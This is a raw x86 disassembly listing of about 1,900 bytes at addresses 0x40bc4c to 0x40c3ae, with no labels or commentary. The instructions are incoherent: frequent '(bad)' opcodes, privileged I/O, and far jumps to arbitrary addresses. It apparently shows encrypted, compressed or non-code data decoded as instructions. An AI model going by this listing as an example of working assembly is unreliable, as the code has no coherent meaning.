  40bc4c:	cmp    edx,DWORD PTR ds:0xcd209c8d
  40bc52:	xor    al,0xec
  40bc54:	dec    edi
  40bc55:	sbb    dh,dl
  40bc57:	lods   eax,DWORD PTR ds:[esi]
  40bc58:	int3   
  40bc59:	cmc    
  40bc5a:	pop    ds
  40bc5b:	pop    es
  40bc5c:	das    
  40bc5d:	loopne 0x40bc9f
  40bc5f:	ret    0x35b6
  40bc62:	sub    ecx,DWORD PTR [edx+0x7eddc9ea]
  40bc68:	jbe    0x40bca8
  40bc6a:	push   0x62
  40bc6c:	mov    edi,0xcc91235e
  40bc71:	addr16 in eax,0xc4
  40bc74:	inc    eax
  40bc75:	xor    ebx,edx
  40bc77:	int3   
  40bc78:	dec    ecx
  40bc79:	xchg   ebx,eax
  40bc7a:	and    al,0x4e
  40bc7c:	imul   ebp,DWORD PTR [ecx],0x2dbeee42
  40bc82:	cdq    
  40bc83:	mov    esi,0x5055c94d
  40bc88:	(bad)  
  40bc89:	iret   
  40bc8a:	in     eax,dx
  40bc8b:	xchg   DWORD PTR [edi],eax
  40bc8d:	loopne 0x40bc37
  40bc8f:	bound  ebx,QWORD PTR [esi]
  40bc91:	dec    esi
  40bc92:	xor    edi,esi
  40bc94:	pop    ds
  40bc95:	lods   eax,DWORD PTR ds:[esi]
  40bc96:	xor    cl,BYTE PTR [ebx]
  40bc98:	ja     0x40bd13
  40bc9a:	in     al,0xa8
  40bc9c:	shl    BYTE PTR [ecx+0x22d8fb],1
  40bca2:	dec    esi
  40bca3:	adc    BYTE PTR [edx+ecx*1+0x623f0f17],bh
  40bcaa:	jns    0x40bca0
  40bcac:	pop    esi
  40bcad:	ins    BYTE PTR es:[edi],dx
  40bcae:	aad    0xa8
  40bcb0:	cmp    DWORD PTR [ebp-0x690a7cba],0x50
  40bcb7:	and    BYTE PTR [edx+edi*2+0x79],ch
  40bcbb:	mov    DWORD PTR [ecx+0x10c15350],ebx
  40bcc1:	and    al,BYTE PTR [esi+eax*8+0x7b]
  40bcc5:	sbb    al,0x9d
  40bcc7:	ins    BYTE PTR es:[edi],dx
  40bcc8:	jge    0x40bd2e
  40bcca:	xchg   ecx,eax
  40bccb:	sbb    cl,0x4a
  40bcce:	adc    BYTE PTR [edi+0xe],ch
  40bcd1:	xchg   edi,eax
  40bcd2:	and    al,0xba
  40bcd4:	(bad)
  40bcd9:	and    eax,0xb597bc37
  40bcde:	inc    esi
  40bcdf:	mov    cl,0xb3
  40bce1:	shr    DWORD PTR [esi+0xc],cl
  40bce4:	inc    ecx
  40bce5:	sbb    bh,BYTE PTR [edi+0x55a0e82d]
  40bceb:	out    0x49,eax
  40bced:	out    dx,al
  40bcee:	ret    0x992f
  40bcf1:	adc    esi,esp
  40bcf3:	cli    
  40bcf4:	popa   
  40bcf5:	dec    edx
  40bcf6:	mov    ecx,0x99511922
  40bcfb:	xor    al,BYTE PTR [esi]
  40bcfd:	daa    
  40bcfe:	mov    DWORD PTR ds:0x9abd0f2e,ecx
  40bd04:	and    DWORD PTR [esi],eax
  40bd06:	jne    0x40bca4
  40bd08:	aas    
  40bd09:	inc    ecx
  40bd0a:	out    0x6f,al
  40bd0c:	loopne 0x40bcc8
  40bd0e:	inc    ebx
  40bd0f:	adc    eax,DWORD PTR [esi]
  40bd11:	out    dx,al
  40bd12:	dec    edi
  40bd13:	and    ecx,DWORD PTR [ecx+0x17107da8]
  40bd19:	dec    edi
  40bd1a:	pop    eax
  40bd1b:	jecxz  0x40bd83
  40bd1d:	ror    BYTE PTR ds:0xc2d6670a,1
  40bd23:	xchg   edi,eax
  40bd24:	mov    ds:0x86822c6b,eax
  40bd29:	fisub  WORD PTR [edx-0x6a]
  40bd2c:	mov    edx,0x3b82c015
  40bd31:	adc    edx,esp
  40bd33:	sbb    eax,0x383dc4d5
  40bd38:	jnp    0x40bcdc
  40bd3a:	pop    ss
  40bd3b:	cdq    
  40bd3c:	dec    edx
  40bd3d:	lods   al,BYTE PTR ds:[esi]
  40bd3e:	dec    ebp
  40bd3f:	push   edi
  40bd40:	lea    ebx,[edi]
  40bd42:	in     eax,0xbf
  40bd44:	push   ss
  40bd45:	test   eax,0x2793c0d3
  40bd4a:	push   ss
  40bd4b:	retf   
  40bd4c:	jo     0x40bd7a
  40bd4e:	mov    ds:0xc4ff5342,al
  40bd53:	rcl    DWORD PTR [edx-0xd6458e0],1
  40bd59:	adc    DWORD PTR [ebx+edi*2+0x48],ecx
  40bd5d:	mov    es,WORD PTR [ecx-0x56]
  40bd60:	push   edi
  40bd61:	es (bad) 
  40bd63:	mov    bh,0xbe
  40bd65:	jmp    0x40bde4
  40bd67:	adc    ebx,esp
  40bd69:	sub    bh,dl
  40bd6b:	sub    al,0xfa
  40bd6d:	xchg   edx,eax
  40bd6e:	cli    
  40bd6f:	daa    
  40bd70:	inc    ebp
  40bd71:	test   al,0x41
  40bd73:	int3   
  40bd74:	scas   eax,DWORD PTR es:[edi]
  40bd75:	ret    
  40bd76:	imul   ebx,DWORD PTR [edx-0x7],0x2e
  40bd7a:	or     bh,bh
  40bd7c:	daa    
  40bd7d:	repz mov al,BYTE PTR [esi+0x57]
  40bd81:	fprem  
  40bd83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd84:	sub    ebp,ecx
  40bd86:	loopne 0x40bd09
  40bd88:	add    BYTE PTR ds:0x5e5e0622,dl
  40bd8e:	aam    0xb5
  40bd90:	inc    ebp
  40bd91:	push   0x21
  40bd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd94:	pop    ebx
  40bd95:	sub    al,0xeb
  40bd97:	xchg   ebx,eax
  40bd98:	ret    
  40bd99:	sbb    dl,dl
  40bd9b:	je     0x40bd8c
  40bd9d:	jb     0x40bd57
  40bd9f:	lods   al,BYTE PTR ds:[esi]
  40bda0:	in     eax,dx
  40bda1:	(bad)  
  40bda2:	mov    ecx,0x32c192d5
  40bda7:	jno    0x40be0f
  40bda9:	mov    al,0x4f
  40bdab:	adc    cl,BYTE PTR [esi+esi*8]
  40bdae:	retf   0x3809
  40bdb1:	mov    esi,0x3811d0d9
  40bdb6:	xor    BYTE PTR [ebp+0x6e1ca622],0xb0
  40bdbd:	mov    bh,0x3a
  40bdbf:	mov    ah,0x4e
  40bdc1:	add    eax,0x31be8dad
  40bdc6:	mov    al,0x10
  40bdc8:	dec    edi
  40bdc9:	pop    ebp
  40bdca:	sbb    eax,ebx
  40bdcc:	mov    al,0x7
  40bdce:	push   edx
  40bdcf:	jnp    0x40bdce
  40bdd1:	jmp    0xa8c0cbf0
  40bdd6:	xor    al,0x6f
  40bdd8:	loop   0x40bdf8
  40bdda:	xlat   BYTE PTR ds:[ebx]
  40bddb:	add    esi,ecx
  40bddd:	xor    DWORD PTR [eax-0xfce3fde],0x95b553dc
  40bde7:	mov    ebx,0x28acda30
  40bdec:	dec    edx
  40bded:	fdivr  QWORD PTR [edx]
  40bdef:	(bad)  
  40bdf0:	xor    ebp,esi
  40bdf2:	and    al,0x96
  40bdf4:	xor    ebx,0xafd0d821
  40bdfa:	lahf   
  40bdfb:	ins    BYTE PTR es:[edi],dx
  40bdfc:	test   eax,eax
  40bdfe:	rcr    DWORD PTR [ecx-0x6c],cl
  40be01:	or     DWORD PTR [ebx-0x3e],ecx
  40be04:	xor    al,0x1f
  40be06:	fild   DWORD PTR [ebx+0x2e160dc5]
  40be0c:	imul   edx,DWORD PTR [ecx-0xc13ca11],0x43ca1276
  40be16:	imul   esi,edi,0x6d
  40be19:	in     eax,0x43
  40be1b:	cmovnp eax,DWORD PTR [edx+0x1a]
  40be1f:	(bad)  
  40be21:	jb     0x40be26
  40be23:	mov    al,ds:0xf74d9958
  40be28:	mov    ebx,0x178da626
  40be2d:	xchg   edx,eax
  40be2e:	dec    edx
  40be2f:	and    al,0x9b
  40be31:	mov    ecx,0x1ebde1c7
  40be36:	test   eax,0x1056d04e
  40be3b:	jns    0x40bde7
  40be3d:	sbb    eax,0x13dff549
  40be42:	xchg   edi,eax
  40be43:	mov    ebp,0x40ed0bba
  40be48:	imul   ebp,eax,0x244b4804
  40be4e:	jmp    0xf7af126b
  40be53:	and    BYTE PTR [edi-0x7e429a0a],al
  40be59:	stos   BYTE PTR es:[edi],al
  40be5a:	in     eax,0x68
  40be5c:	scas   al,BYTE PTR es:[edi]
  40be5d:	pop    edi
  40be5e:	pop    edi
  40be5f:	out    0xd4,eax
  40be61:	fdivr  QWORD PTR [edi-0x20]
  40be64:	mov    al,0x3a
  40be66:	outs   dx,DWORD PTR ds:[esi]
  40be67:	rol    BYTE PTR ds:0x288c4b84,1
  40be6d:	fst    QWORD PTR [edx]
  40be6f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40be71:	cmp    eax,0x907b986b
  40be76:	jecxz  0x40be30
  40be78:	les    eax,FWORD PTR [edx-0x2b]
  40be7b:	psrlw  mm4,QWORD PTR [ecx-0x42]
  40be7f:	xchg   edi,eax
  40be80:	ins    DWORD PTR es:[edi],dx
  40be81:	in     al,0xee
  40be83:	(bad)  
  40be84:	mov    ebp,0xb43f75eb
  40be89:	cmp    ebx,DWORD PTR [edx]
  40be8b:	shl    DWORD PTR [esi+0xcea40cd],0x37
  40be92:	jle    0x40be4c
  40be94:	(bad)  
  40be95:	fsubr  QWORD PTR [edi-0x23]
  40be98:	test   ah,al
  40be9a:	xlat   BYTE PTR ds:[ebx]
  40be9b:	xchg   esp,eax
  40be9c:	and    cl,BYTE PTR [edx+0x7848c73d]
  40bea2:	lock mov al,0x77
  40bea5:	push   ebp
  40bea6:	sub    edi,ecx
  40bea8:	clc    
  40bea9:	lahf   
  40beaa:	stc    
  40beab:	xor    bl,BYTE PTR [eax+ebx*4+0x6a]
  40beaf:	rol    BYTE PTR [ecx+edi*1],1
  40beb2:	push   eax
  40beb3:	cmp    eax,0x803fbd06
  40beb8:	mov    BYTE PTR [ebx-0x64],al
  40bebb:	pop    ecx
  40bebc:	ficomp DWORD PTR [edi]
  40bebe:	jns    0x40bf3f
  40bec0:	(bad)  
  40bec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bec2:	mov    cl,0xb0
  40bec4:	mov    bl,BYTE PTR [eax-0x28]
  40bec7:	xor    eax,0x2298e3b
  40becc:	mov    al,ds:0x965d0b28
  40bed1:	(bad)  
  40bed2:	dec    edx
  40bed3:	pop    ebx
  40bed4:	inc    eax
  40bed5:	dec    ebp
  40bed6:	jae    0x40be6f
  40bed8:	push   esp
  40bed9:	int3   
  40beda:	sub    ch,BYTE PTR [ebp+0x69]
  40bedd:	sbb    BYTE PTR [edi],cl
  40bedf:	in     al,0x78
  40bee1:	sbb    BYTE PTR [eax+0x21e627c1],al
  40bee7:	xchg   edi,eax
  40bee8:	push   eax
  40bee9:	mov    bl,0xb9
  40beeb:	sub    al,0x53
  40beed:	cmp    cl,BYTE PTR [ebx+0xdef0b46]
  40bef3:	lds    eax,FWORD PTR [ebx-0x59]
  40bef6:	mov    esi,0xc9f5dbe0
  40befb:	stos   DWORD PTR es:[edi],eax
  40befc:	jo     0x40bf7a
  40befe:	int3   
  40beff:	jno    0x40bedf
  40bf01:	js     0x40bef1
  40bf03:	pop    ebp
  40bf04:	xchg   edi,eax
  40bf05:	sbb    al,BYTE PTR [edx]
  40bf07:	jae    0x40bf13
  40bf09:	jae    0x40bf6e
  40bf0b:	(bad)  
  40bf0d:	sbb    esi,DWORD PTR [edx-0x51]
  40bf10:	addr16 ds mov bl,0x9f
  40bf14:	mov    eax,ds:0x1d352478
  40bf19:	sub    BYTE PTR [esi-0x80aa8a5],0xb5
  40bf20:	mov    BYTE PTR [edi+0x36],0x43
  40bf24:	cmp    dl,BYTE PTR [edx-0x21640747]
  40bf2a:	xchg   ebx,eax
  40bf2b:	inc    edx
  40bf2c:	and    al,0x96
  40bf2e:	cmp    ch,BYTE PTR [ecx-0x3d469f07]
  40bf34:	mov    ds:0xa3316cef,al
  40bf39:	sub    edx,esi
  40bf3b:	mov    fs,WORD PTR [edx]
  40bf3d:	adc    al,0x7
  40bf3f:	test   eax,0x78188e4e
  40bf44:	xchg   esp,ebx
  40bf46:	ret    0x9109
  40bf49:	sti    
  40bf4a:	pop    eax
  40bf4b:	and    eax,0x3e8c53df
  40bf50:	add    cl,BYTE PTR [eax+ebp*2-0x55]
  40bf54:	xchg   esp,eax
  40bf55:	dec    esp
  40bf56:	mov    ecx,0x6dd628e1
  40bf5b:	xchg   edx,eax
  40bf5c:	aam    0x6a
  40bf5e:	inc    esi
  40bf5f:	sti    
  40bf60:	mov    dl,0xa8
  40bf62:	sbb    DWORD PTR [ecx+edi*1-0x35f5132a],ecx
  40bf69:	stc    
  40bf6a:	imul   ecx,DWORD PTR [esi+0x72],0xffffffc3
  40bf6e:	aad    0xdc
  40bf70:	ins    DWORD PTR es:[edi],dx
  40bf71:	jae    0x40bf5d
  40bf73:	mov    bl,0x29
  40bf75:	cmp    eax,0x85e7af33
  40bf7a:	popa   
  40bf7b:	(bad)  
  40bf7c:	fdiv   DWORD PTR [ebx-0x3]
  40bf7f:	pop    ebx
  40bf80:	js     0x40bf59
  40bf82:	mov    eax,0x1e81f638
  40bf87:	sbb    ebx,edx
  40bf89:	jg     0x40bfd2
  40bf8b:	mov    bh,0xec
  40bf8d:	xor    al,0x6
  40bf8f:	adc    DWORD PTR [ecx+eiz*1+0x43],esi
  40bf93:	xchg   DWORD PTR [ebx-0x43b55f85],ebx
  40bf99:	retf   0x10d8
  40bf9c:	cs mov cl,0xdd
  40bf9f:	js     0x40bf36
  40bfa1:	in     eax,dx
  40bfa2:	sub    ch,BYTE PTR [ecx+0x2a48a3c7]
  40bfa8:	into   
  40bfa9:	jmp    0xb3c4:0xccb5e8f0
  40bfb0:	jae    0x40c01d
  40bfb2:	ret    
  40bfb3:	adc    bl,BYTE PTR [ebx]
  40bfb5:	xchg   esi,eax
  40bfb6:	xor    cl,BYTE PTR [ebp-0x77a35ec2]
  40bfbc:	jge    0x40bfcd
  40bfbe:	sub    cl,bl
  40bfc0:	and    al,0xa4
  40bfc2:	les    edx,FWORD PTR [esi+0xb]
  40bfc5:	mov    al,ds:0x247ae9bc
  40bfca:	(bad)  [ebx+ecx*8+0x15b5d55a]
  40bfd1:	fs leave 
  40bfd3:	loop   0x40c035
  40bfd5:	mov    edx,0x823c2e3e
  40bfda:	mov    gs,WORD PTR [edi]
  40bfdc:	ret    
  40bfdd:	push   es
  40bfde:	pop    ecx
  40bfdf:	mov    esp,0x46aca356
  40bfe4:	je     0x40c026
  40bfe6:	out    0xba,eax
  40bfe8:	add    al,0x33
  40bfea:	mul    esi
  40bfec:	cmp    BYTE PTR [ebp-0x4e],bh
  40bfef:	mov    gs,WORD PTR [esi-0x10811237]
  40bff5:	sub    bl,dh
  40bff7:	mov    edi,0x398de678
  40bffc:	outs   dx,DWORD PTR ds:[esi]
  40bffd:	lds    edx,FWORD PTR [eax]
  40bfff:	int3   
  40c000:	mov    edi,0x2752416a
  40c005:	sub    dh,dl
  40c007:	push   esi
  40c008:	icebp  
  40c009:	cs jecxz 0x40bfd8
  40c00c:	pop    ecx
  40c00d:	dec    ebx
  40c00e:	shl    DWORD PTR ds:[edi+0x1c],0x8b
  40c013:	mov    edx,DWORD PTR [ecx-0x34]
  40c016:	cmp    eax,0x741d7219
  40c01b:	mov    edi,0x2a235eae
  40c020:	xor    bl,al
  40c022:	mov    bh,0x18
  40c024:	fwait
  40c025:	inc    esp
  40c026:	std    
  40c027:	loope  0x40c014
  40c029:	test   BYTE PTR [edi-0x17],ah
  40c02c:	sub    DWORD PTR [edi],ebx
  40c02e:	cmp    al,BYTE PTR [edi+0x27]
  40c031:	popaw  
  40c033:	cmp    ebx,DWORD PTR [ebx+0x10a66188]
  40c039:	stc    
  40c03a:	mov    ?,WORD PTR [eax+0x2c]
  40c03d:	xor    BYTE PTR [eax],bh
  40c03f:	pop    ebp
  40c040:	fistp  DWORD PTR [ebx]
  40c042:	in     al,dx
  40c043:	or     eax,0x9acf861d
  40c048:	loopne 0x40c030
  40c04a:	pop    esp
  40c04b:	and    al,0x9f
  40c04d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c04e:	jbe    0x40bffa
  40c050:	push   esi
  40c051:	lods   al,BYTE PTR ds:[esi]
  40c052:	mov    ds:0x4814998c,al
  40c057:	adc    bl,BYTE PTR [eax+0x3a5e85f7]
  40c05d:	sbb    eax,0x5bee3373
  40c062:	pop    ebx
  40c063:	mov    eax,ds:0x448ee6fb
  40c068:	adc    DWORD PTR [ecx+0x6c],edi
  40c06b:	cmp    eax,0x812cb852
  40c070:	sbb    al,0x38
  40c072:	(bad)  
  40c073:	mov    bl,0x1f
  40c075:	add    DWORD PTR [ebx],ebp
  40c077:	xchg   DWORD PTR [ebx],edx
  40c079:	cmp    ah,BYTE PTR [eax+0x55]
  40c07c:	add    eax,0x20296067
  40c081:	pop    esp
  40c082:	push   edi
  40c083:	in     eax,0x60
  40c085:	mov    ecx,0x7b887a45
  40c08a:	mov    ebp,0x929d6970
  40c08f:	int3   
  40c090:	jmp    0x53bf4be8
  40c095:	mov    ebx,0x2d7f758d
  40c09a:	les    esi,FWORD PTR [ebp-0x49]
  40c09d:	or     edi,DWORD PTR [ebp+0x5]
  40c0a0:	lea    esp,[eax+0x5f]
  40c0a3:	daa    
  40c0a4:	or     ebx,DWORD PTR [ecx+0x52]
  40c0a7:	sub    DWORD PTR [esp+edx*4],0x2ced28e0
  40c0ae:	xor    ecx,DWORD PTR [ebx]
  40c0b0:	adc    al,0xbe
  40c0b2:	sbb    esi,DWORD PTR [ebx-0x7f]
  40c0b5:	dec    edi
  40c0b6:	pop    es
  40c0b7:	pop    edx
  40c0b8:	pop    ss
  40c0b9:	push   ecx
  40c0ba:	jle    0x40c0a6
  40c0bc:	add    eax,0xbb67486f
  40c0c1:	mov    eax,0x60f1a0a4
  40c0c6:	xor    al,0xad
  40c0c8:	popf   
  40c0c9:	add    DWORD PTR [ebx],ebx
  40c0cb:	jle    0x40c100
  40c0cd:	pop    esi
  40c0ce:	ja     0x40c09d
  40c0d0:	pop    esp
  40c0d1:	fdiv   DWORD PTR [eax]
  40c0d3:	sbb    ebx,DWORD PTR [esi]
  40c0d5:	test   BYTE PTR [ebx],bh
  40c0d7:	pusha  
  40c0d8:	jo     0x40c077
  40c0da:	into   
  40c0db:	mov    DWORD PTR [ebp-0x3a],ecx
  40c0de:	int3   
  40c0df:	xchg   esp,eax
  40c0e0:	(bad)  
  40c0e1:	(bad)  
  40c0e2:	dec    ebp
  40c0e3:	lods   al,BYTE PTR ds:[esi]
  40c0e4:	or     ah,BYTE PTR [edi+esi*2-0xb]
  40c0e8:	inc    ebp
  40c0e9:	add    DWORD PTR [edi+0x63],ebx
  40c0ec:	sbb    ch,BYTE PTR [ebp+0x47]
  40c0ef:	or     dh,BYTE PTR ds:0xbb925df9
  40c0f5:	fidiv  DWORD PTR [eax-0x73]
  40c0f8:	xchg   esi,eax
  40c0f9:	inc    ebx
  40c0fa:	pop    ds
  40c0fb:	add    bl,BYTE PTR [ebx+eiz*4+0x66]
  40c0ff:	and    ecx,DWORD PTR [esi-0x40]
  40c102:	xor    eax,0xa21ce8b9
  40c107:	jle    0x40c182
  40c109:	xor    al,0x9d
  40c10b:	adc    eax,0x826bd370
  40c110:	cmp    DWORD PTR [ebp-0xe],eax
  40c113:	clc    
  40c114:	loop   0x40c142
  40c116:	lock (bad) 
  40c118:	jecxz  0x40c142
  40c11a:	shr    BYTE PTR [ebx-0x39],0x51
  40c11e:	mov    al,0x4e
  40c120:	inc    ebp
  40c121:	mov    esi,0xdb729a6f
  40c126:	mov    fs,ebp
  40c128:	mov    BYTE PTR [eiz*1-0x288a3aa],bl
  40c12f:	gs jmp 0x89aca000
  40c135:	lds    esi,FWORD PTR [ecx]
  40c137:	adc    DWORD PTR [ebx-0x289370df],edx
  40c13d:	sub    ecx,DWORD PTR [edx+0x74d6f49c]
  40c143:	or     al,BYTE PTR [edi+0xb59d3b0]
  40c149:	loopne 0x40c152
  40c14b:	push   edx
  40c14c:	lea    ecx,[ebx+esi*4]
  40c14f:	mov    bl,0xa6
  40c151:	xchg   ecx,eax
  40c152:	loopne 0x40c0f7
  40c154:	jb     0x40c1bd
  40c156:	js     0x40c106
  40c158:	jns    0x40c1d2
  40c15a:	mov    ch,0xd3
  40c15c:	addr16 mov edx,0x7712a2af
  40c162:	xchg   ebx,eax
  40c163:	jle    0x40c11d
  40c165:	push   eax
  40c166:	cmp    eax,DWORD PTR gs:[eax+ecx*4+0x40]
  40c16b:	in     eax,dx
  40c16c:	in     al,dx
  40c16d:	jmp    0x40c1e0
  40c16f:	adc    eax,0x89268176
  40c174:	pop    es
  40c175:	add    al,0xe6
  40c177:	mov    ebp,0x3c303c84
  40c17c:	sbb    eax,DWORD PTR [ebx-0x28]
  40c17f:	sub    edi,DWORD PTR [eax+ebx*2-0x3750f84c]
  40c186:	add    DWORD PTR [edi],esi
  40c188:	jle    0x40c1fe
  40c18a:	inc    esp
  40c18b:	retf   0x45f4
  40c18e:	stc    
  40c18f:	cmp    eax,0x1202d90f
  40c194:	mov    esi,0x9c1b4df
  40c199:	push   ebp
  40c19a:	push   edi
  40c19b:	cmp    al,BYTE PTR [esi-0x3a]
  40c19e:	aaa    
  40c19f:	adc    al,0xc1
  40c1a1:	sbb    al,0x2d
  40c1a3:	add    DWORD PTR [ebx],esi
  40c1a5:	sti    
  40c1a6:	bound  ebx,QWORD PTR ds:0x13e27341
  40c1ac:	js     0x40c172
  40c1ae:	(bad)  
  40c1b0:	test   eax,0x3ea086c4
  40c1b5:	xor    ebx,DWORD PTR [ebp-0x7]
  40c1b8:	rcr    BYTE PTR [ecx+0x66a7809b],1
  40c1be:	push   ds
  40c1bf:	pop    ss
  40c1c0:	push   ebx
  40c1c1:	fcomp  DWORD PTR [edx+0x5e]
  40c1c4:	mov    al,ds:0xd3c8f66f
  40c1c9:	cmc    
  40c1ca:	in     al,0x21
  40c1cc:	rol    DWORD PTR [edx+0x4c711a62],cl
  40c1d2:	mov    DWORD PTR [edi+0x4ed0efe4],esi
  40c1d8:	cmp    al,BYTE PTR [edi+0x79]
  40c1db:	jo     0x40c18a
  40c1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1de:	std    
  40c1df:	cdq    
  40c1e0:	std    
  40c1e1:	(bad)  
  40c1e2:	mov    ebp,0x8be4be64
  40c1e7:	push   edx
  40c1e8:	test   BYTE PTR [ebx],dh
  40c1ea:	out    dx,al
  40c1eb:	outs   dx,BYTE PTR ds:[esi]
  40c1ec:	leave  
  40c1ed:	cs xchg ecx,eax
  40c1ef:	dec    ecx
  40c1f0:	rcl    DWORD PTR [edi],1
  40c1f2:	mov    ch,0x56
  40c1f4:	push   edi
  40c1f5:	jno    0x40c263
  40c1f7:	jmp    0x40c203
  40c1f9:	mov    al,ds:0x969ee12f
  40c1fe:	jp     0x40c18c
  40c200:	stos   DWORD PTR es:[edi],eax
  40c201:	jg     0x40c24b
  40c203:	popf   
  40c204:	or     al,BYTE PTR fs:[ebx+ebp*1]
  40c208:	test   BYTE PTR [edi-0x7b],0xd9
  40c20c:	push   eax
  40c20d:	(bad)  
  40c20e:	fs mov bh,0x46
  40c211:	inc    eax
  40c212:	sbb    BYTE PTR [ecx],dh
  40c214:	push   ds
  40c215:	xor    al,0x8b
  40c217:	lahf   
  40c218:	xor    bl,BYTE PTR [ecx-0x14]
  40c21b:	lahf   
  40c21c:	dec    edx
  40c21d:	xor    al,0x5d
  40c21f:	scas   eax,DWORD PTR es:[edi]
  40c220:	add    DWORD PTR [ebp-0x72],edi
  40c223:	jmp    0x2c5e:0x29b9c1d0
  40c22a:	cmc    
  40c22b:	test   BYTE PTR [ebp+eax*2-0x24],ah
  40c22f:	shl    esp,cl
  40c231:	mov    edx,DWORD PTR [esi+0x15]
  40c234:	jmp    FWORD PTR [eax-0x5e417f22]
  40c23a:	dec    ebx
  40c23b:	xchg   BYTE PTR [edx+0x3d2f7e70],ah
  40c241:	add    ecx,DWORD PTR [ebx-0xe]
  40c244:	hlt    
  40c245:	add    DWORD PTR [ebx-0x44406268],esi
  40c24b:	dec    esp
  40c24c:	adc    edx,DWORD PTR [edx]
  40c24e:	xor    al,0xb0
  40c250:	sbb    bh,al
  40c252:	cmp    eax,esi
  40c254:	test   ch,bl
  40c256:	jno    0x40c231
  40c258:	cld    
  40c259:	xchg   ebp,eax
  40c25a:	pop    ebx
  40c25b:	push   edi
  40c25c:	sar    DWORD PTR [eax-0x64376e0d],1
  40c262:	jp     0x40c204
  40c264:	pop    es
  40c265:	or     ecx,0x3f51c02b
  40c26b:	iret   
  40c26c:	loopne 0x40c240
  40c26e:	pop    es
  40c26f:	add    bl,BYTE PTR [esi+0x15]
  40c272:	xor    DWORD PTR [ecx+0x5a7bc66],edi
  40c278:	jmp    0x40c2e9
  40c27a:	nop
  40c27b:	test   eax,0xa948266b
  40c280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c281:	sub    eax,0xf4780a00
  40c286:	outs   dx,BYTE PTR ds:[esi]
  40c287:	push   0xf4613d9f
  40c28c:	pop    es
  40c28d:	test   eax,0x752a1e37
  40c292:	mov    ecx,0x10ae65bc
  40c297:	jbe    0x40c277
  40c299:	int3   
  40c29a:	shr    ebx,0x81
  40c29d:	cmp    dl,0xfa
  40c2a0:	xor    esi,eax
  40c2a2:	add    al,0x1a
  40c2a4:	fnsave [ebx-0x5ba99864]
  40c2aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ab:	push   eax
  40c2ac:	xlat   BYTE PTR ds:[ebx]
  40c2ad:	or     ebx,eax
  40c2af:	inc    edi
  40c2b0:	or     esi,DWORD PTR [ebx+0x4adddfaa]
  40c2b6:	fcomp  DWORD PTR [esi-0x37005832]
  40c2bd:	loop   0x40c275
  40c2bf:	adc    DWORD PTR [edi+0x42],esp
  40c2c2:	sbb    DWORD PTR [edi-0x1c0e6ff3],0x83fde66f
  40c2cc:	cdq    
  40c2cd:	dec    cx
  40c2cf:	pop    esi
  40c2d0:	(bad)  
  40c2d1:	sbb    al,BYTE PTR [ecx+0x5d]
  40c2d4:	xor    al,0xb8
  40c2d6:	enter  0x9ae,0x63
  40c2da:	loop   0x40c2be
  40c2dc:	sbb    BYTE PTR [edi+0x74],cl
  40c2df:	out    0x6,al
  40c2e1:	lods   eax,DWORD PTR ds:[esi]
  40c2e2:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c2e4:	repnz push ebp
  40c2e6:	ja     0x40c337
  40c2e8:	cs neg esi
  40c2eb:	xchg   ebx,eax
  40c2ec:	and    dl,dl
  40c2ee:	into   
  40c2ef:	sub    al,0x40
  40c2f1:	cs pop ecx
  40c2f3:	xchg   edx,eax
  40c2f4:	ficomp WORD PTR [esi+0x64fda8df]
  40c2fa:	lods   al,BYTE PTR ds:[esi]
  40c2fb:	sbb    al,0x91
  40c2fd:	int3   
  40c2fe:	mov    bh,0x25
  40c300:	xlat   BYTE PTR ds:[ebx]
  40c301:	mov    al,ds:0x9da5d16b
  40c306:	js     0x40c326
  40c308:	scas   eax,DWORD PTR es:[edi]
  40c309:	push   eax
  40c30a:	stos   DWORD PTR es:[edi],eax
  40c30b:	add    eax,0xb28aa74c
  40c310:	cmp    edi,esp
  40c312:	jmp    0x40c2d4
  40c314:	mov    eax,0xf37d709d
  40c319:	or     dh,BYTE PTR [ebp+0x443f68b1]
  40c31f:	rcr    DWORD PTR [edx+0x5a9c1d45],1
  40c325:	push   ebp
  40c326:	(bad)  
  40c327:	mov    ds:0x3c9f6908,al
  40c32c:	rcl    DWORD PTR [bx+di+0x6d],0x1d
  40c331:	xchg   esi,eax
  40c332:	sti    
  40c333:	jnp    0x40c36e
  40c335:	lea    eax,[edi+edx*1]
  40c338:	rcr    dh,cl
  40c33a:	(bad)  
  40c33b:	scas   al,BYTE PTR es:[edi]
  40c33c:	out    dx,al
  40c33d:	inc    edi
  40c33e:	sub    al,0xe5
  40c340:	push   eax
  40c341:	push   edx
  40c342:	mov    gs,WORD PTR [ebp+0x35]
  40c345:	test   al,0xd6
  40c347:	add    bh,BYTE PTR [ebx-0x2a1bd4de]
  40c34d:	jne    0x40c3c7
  40c34f:	pop    edi
  40c350:	mov    ecx,0xc26f0674
  40c355:	fimul  WORD PTR [edi+0x3e062c93]
  40c35b:	call   0x6271:0x31188be6
  40c362:	enter  0xfa8d,0x96
  40c366:	ja     0x40c319
  40c368:	lea    eax,[edx]
  40c36a:	and    bl,BYTE PTR [ebx+esi*4+0x47]
  40c36e:	mov    fs,WORD PTR [edi+eax*2-0x24b3b13c]
  40c375:	mov    DWORD PTR [ebp-0x1f],eax
  40c378:	shl    DWORD PTR [ecx],1
  40c37a:	stos   DWORD PTR es:[edi],eax
  40c37b:	dec    esp
  40c37c:	xchg   BYTE PTR [edi+edx*1-0x27],dl
  40c380:	retf   
  40c381:	mov    al,ds:0x299fab11
  40c386:	(bad)  
  40c387:	pop    ss
  40c388:	jne    0x40c370
  40c38a:	push   ecx
  40c38b:	sub    edi,edi
  40c38d:	popf   
  40c38e:	jnp    0x40c399
  40c390:	and    ch,BYTE PTR [esi+0x3a]
  40c393:	std    
  40c394:	add    BYTE PTR [edi+0x494def76],0x1c
  40c39b:	jp     0x40c347
  40c39d:	add    esp,esi
  40c39f:	dec    ebp
  40c3a0:	fidivr WORD PTR [edi+ebx*8-0x708aa712]
  40c3a7:	push   ebx
  40c3a8:	xor    al,0x17
  40c3aa:	ficom  WORD PTR [ebp-0x79]
  40c3ad:	inc    esi
  40c3ae:	test   eax,0x72da8960
